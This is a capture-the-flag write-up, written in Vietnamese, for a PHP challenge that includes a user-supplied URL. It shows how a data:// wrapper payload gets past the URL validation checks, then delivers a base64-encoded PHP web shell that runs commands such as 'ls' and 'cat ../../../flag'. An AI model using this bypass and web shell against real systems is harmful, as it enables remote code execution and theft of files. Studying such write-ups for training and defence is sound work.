# [CTF] child_orange
## Solution
Source code:
```
<?php
  ini_set('open_basedir', '.');
  if(isset($_GET['url'])){
    $url = $_GET['url']; //.".txt";       I think i should make this challenge eaiser :)))
    if(!filter_var($url, FILTER_VALIDATE_URL)) exit("invalid url");
    if(!preg_match("/http:\/\/nhienit.kma:2010\//",$url)) exit("invalid server");
    if(preg_match("/@|#|\(|\)|\\$|`|'|\"|_|{|}|\?/",$url)) exit("you are not orange");
    if((parse_url($url)['host'] !== "nhienit.kma") || (parse_url($url)['port'] !== 2010)) exit("invalid host or port");
    if(parse_url($url)['user'] || parse_url($url)['pass']) exit("you are not orange");
    include $url;
  }
  else {
    highlight_file(__FILE__); 
    exit();
  }
  // Hint: Google is your friend!!!! XD
?>
```
Review qua source code nào:
param ``url`` ở đây được đối xử như 1 URL thật và nó phải pass qua 1 đống ``filter_var``, ``preg_match`` , ``parse_url`` , đến đây mình dự đoán nó có thể là RFI rồi. 

Theo hint của anh Nhiên thì lọ mọ đi search google thoy. sau khi search 1 hồi thì mình tìm thấy, 1 số report cũng như bài thuyết trình của ``orange tsai`` :-=)) Trong BlackHat nói về SSRF dẫn đến exploiting ``parse_url``. Nó có 1 số thủ thuật khá hay để abusing cái parse_url như là thêm @ để làm cái parse_url nhầm lẫn giữa ``host`` và ``user`` hoặc là CSRF ( ``\r\n``),.. 

![img](./img/Screenshot%20from%202022-03-04%2022-55-29.png)

Reference:
- https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
- https://www.youtube.com/watch?v=voTHFdL9S2k&t=222s

Đến đây mình đã đinh ninh bài này nó là SSRF rồi RFI rùi nhưng mà khoan, các thủ thuật trên đều phải trigger vào giữa cái url, cái này nó không thỏa mãn được điều kiện ``if(!preg_match("/http:\/\/nhienit.kma:2010\//",$url))``.. soo how?

Thực ra còn 1 cách khác không liên quan đến cách trên đó chính là dùng ``php wrapper``, cụ thể mình dùng ``data://`` 
Reference: https://www.php.net/manual/en/wrappers.data.php . 

Mình đã test thử với filter ``if(!filter_var($url, FILTER_VALIDATE_URL)) exit("invalid url");`` và bằng cách thần kì nào đó nó coi wrapper là 1 validate url =)).

![img](./img/Screenshot%20from%202022-03-04%2023-05-19.png)

Cho nó vào parse_url() để var_dump nó ra xem như thế nào: ``

![img](./img/Screenshot%20from%202022-03-04%2023-10-40.png)

hmm thế này là không thoả mãn đuợc ``if((parse_url($url)['host'] !== "nhienit.kma") || (parse_url($url)['port'] !== 2010)) exit("invalid host or port");``. Thử thêm text vào truớc scheme ``http`` để trigger xem sao. payload: ``url="data://sometext/http:/nhienit.kma:2010//plain,test";``

![img](./img/Screenshot%20from%202022-03-04%2023-14-26.png)

Bingo, bằng cách này ta có thể abuse host và port của cái parse_url

payload của mình sẽ là:

``url=data://nhienit.kma:2010/http://nhienit.kma:2010/plain,test;``

![img](./img/Screenshot%20from%202022-03-04%2023-18-19.png)

Đây là tiền đề để có thể thực hiện rce rồi, mình có thể ném script php lên (php wrapper sẽ execute code của mình) , cụ thể trong bài này ta phỉa encode script php theo dạng base64 vì ``php tag`` bị dính filter. script php: ``PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`` (aka ``<?php system($_GET['cmd']);?>``)

payload: 
``?url=data://nhienit.kma:2010/http://nhienit.kma:2010/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls -lsa``

![img](./img/Screenshot%20from%202022-03-04%2023-26-08.png)

nice, final payload:

``?url=data://nhienit.kma:2010/http://nhienit.kma:2010/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=cat ../../../flag``

flag: KCSC{flag_for_testing}
